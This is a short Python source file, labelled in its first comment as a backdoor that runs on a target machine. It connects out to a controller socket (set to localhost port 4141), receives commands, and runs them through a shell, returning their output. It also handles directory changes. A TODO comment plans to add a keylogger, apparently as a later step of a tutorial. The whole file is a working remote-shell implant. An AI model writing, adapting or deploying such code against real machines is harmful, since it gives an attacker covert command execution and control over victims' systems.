#backdoor that runs on target machine
import socket
import json
import os
import sys
import subprocess
import threading
import time

ip = '127.0.0.1'
port = 4141

client = socket.socket()
client.connect((ip, port))
print("connected")

def execute_shell():
    while True:
        data = client.recv(1024).decode()

        print(f"command received: {data}")

        if data == 'quit':
            break
        elif data[:2] == 'cd':
            try:
                os.chdir(data[3:])

            except:#there wasn't anything after "cd"
                pass
                
            finally:
                client.send(os.getcwd().encode())

        #TODO add elif('s) for keylogger (step 6)
        else:
            op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            client.send(op.stdout.read() + op.stderr.read())
        
        

execute_shell()




